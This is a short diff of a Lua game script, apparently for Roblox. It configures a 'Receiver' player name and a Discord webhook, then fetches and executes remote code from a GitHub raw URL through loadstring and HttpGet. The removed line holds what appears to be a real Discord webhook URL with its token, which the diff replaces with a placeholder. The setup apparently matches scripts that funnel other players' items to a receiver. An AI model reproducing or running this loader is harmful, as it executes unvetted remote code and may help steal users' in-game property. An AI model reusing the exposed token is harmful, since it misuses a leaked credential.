@@ -1,5 +1,5 @@
 local Receiver = "PlayerUser"
-local Webhook = "https://discord.com/api/webhooks/1284445411507175477/Es4Oli3n0v_AfhHXnE5iQb57f5QJDBpJo0RD2K1cCjJeXWdwUJQV-pgL-RbiHN9HxFkM" 
+local Webhook = "your discord webhook" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/MemeSea/main/Source.lua"))()
 
